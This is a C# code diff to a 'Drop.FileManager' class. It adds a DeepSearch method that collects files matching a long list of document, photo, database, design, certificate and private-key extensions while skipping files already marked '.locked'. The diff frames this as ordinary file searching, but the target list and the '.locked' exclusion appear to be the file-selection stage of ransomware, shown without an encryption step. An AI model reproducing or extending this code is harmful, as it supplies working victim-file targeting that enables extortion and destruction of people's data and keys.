@@ -29,6 +29,12 @@ namespace Drop.FileManager
     public class NManager
     {
         private string files;
+
+        /// <summary>
+        /// Gets all files in all the directories given as the first parameter.
+        /// </summary>
+        /// <param name="directories">Directory paths to search in</param>
+        /// <returns>An array of all found files</returns>
         public string[] GetFiles(string[] directories)
         {
             string[] splitstr = new string[1];
@@ -46,15 +52,115 @@ namespace Drop.FileManager
             return retStr.Split(splitstr, StringSplitOptions.RemoveEmptyEntries);
         }
 
-        public string[] GetFolders(string path)
+        /// <summary>
+        /// Searches for the files with a specific format.
+        /// </summary>
+        /// <param name="directories">Directory paths to search in</param>
+        /// <returns>An array of all the found files</returns>
+        static string[] DeepSearch(string[] directories)
         {
             string[] splitstr = new string[1];
             splitstr[0] = "\n";
-            return GetAllFolders(path).Split(splitstr, StringSplitOptions.RemoveEmptyEntries);
+
+            string outstr = string.Empty;
+            foreach (string directory in directories)
+            {
+                foreach (string file in Directory.GetFiles(directory))
+                {
+                    if (!file.Contains(".locked"))
+                    {
+                        if (file.Contains(".pdf") ||
+                            file.Contains(".png") ||
+                            file.Contains(".odt") ||
+                            file.Contains(".ods") ||
+                            file.Contains(".odp") ||
+                            file.Contains(".odm") ||
+                            file.Contains(".odc") ||
+                            file.Contains(".odb") ||
+                            file.Contains(".wps") ||
+                            file.Contains(".xls") ||
+                            file.Contains(".xlsx") ||
+                            file.Contains(".xlsm") ||
+                            file.Contains(".xlsb") ||
+                            file.Contains(".xlk") ||
+                            file.Contains(".ppt") ||
+                            file.Contains(".pptx") ||
+                            file.Contains(".pptm") ||
+                            file.Contains(".mdb") ||
+                            file.Contains(".accdb") ||
+                            file.Contains(".pst") ||
+                            file.Contains(".dwg") ||
+                            file.Contains(".dxf") ||
+                            file.Contains(".dxg") ||
+                            file.Contains(".wpd") ||
+                            file.Contains(".rtf") ||
+                            file.Contains(".wb2") ||
+                            file.Contains(".mdf") ||
+                            file.Contains(".dbf") ||
+                            file.Contains(".psd") ||
+                            file.Contains(".pdd") ||
+                            file.Contains(".eps") ||
+                            file.Contains(".ai") ||
+                            file.Contains(".indd") ||
+                            file.Contains(".cdr") ||
+                            file.Contains(".jpg") ||
+                            file.Contains(".doc") ||
+                            file.Contains(".jpe") ||
+                            file.Contains(".dng") ||
+                            file.Contains(".3fr") ||
+                            file.Contains(".arw") ||
+                            file.Contains(".srf") ||
+                            file.Contains(".sr2") ||
+                            file.Contains(".bay") ||
+                            file.Contains(".crw") ||
+                            file.Contains(".cr2") ||
+                            file.Contains(".dcr") ||
+                            file.Contains(".kdc") ||
+                            file.Contains(".erf") ||
+                            file.Contains(".mef") ||
+                            file.Contains(".mrw") ||
+                            file.Contains(".nef") ||
+                            file.Contains(".nrw") ||
+                            file.Contains(".orf") ||
+                            file.Contains(".raf") ||
+                            file.Contains(".raw") ||
+                            file.Contains(".rwl") ||
+                            file.Contains(".rw2") ||
+                            file.Contains(".r3d") ||
+                            file.Contains(".ptx") ||
+                            file.Contains(".pef") ||
+                            file.Contains(".srw") ||
+                            file.Contains(".x3f") ||
+                            file.Contains(".der") ||
+                            file.Contains(".cer") ||
+                            file.Contains(".crt") ||
+                            file.Contains(".pem") ||
+                            file.Contains(".pfx") ||
+                            file.Contains(".p12") ||
+                            file.Contains(".p7b") ||
+                            file.Contains(".p7c") ||
+                            file.Contains(".docx") ||
+                            file.Contains(".docm") ||
+                            file.Contains(".lnk"))
+                        {
+                            outstr += file + "\n";
+                        }
+                    }
+                }
+            }
+            return outstr.Split(splitstr, StringSplitOptions.RemoveEmptyEntries);
         }
 
-        private string GetAllFolders(string path)
+        /// <summary>
+        /// Searches for all the folders in the given path.
+        /// </summary>
+        /// <param name="path">The path to search in</param>
+        /// <returns>An array of all the found folders</returns>
+        public string[] GetAllFolders(string path)
         {
+            string[] splitstr = new string[1];
+            splitstr[0] = "\n";
+
             foreach (string f in Directory.GetDirectories(path))
             {
                 if (
@@ -72,8 +178,14 @@ namespace Drop.FileManager
                     GetAllFolders(f);
                 }
             }
-            return files;
+            return files.Split(splitstr, StringSplitOptions.RemoveEmptyEntries);
         }
+
+        /// <summary>
+        /// Determines whether or not you can look into a file and make changes
+        /// </summary>
+        /// <param name="path">Folder to check</param>
+        /// <returns>The permission</returns>
         private bool HasWritePermissionOnDir(string path)
         {
             try
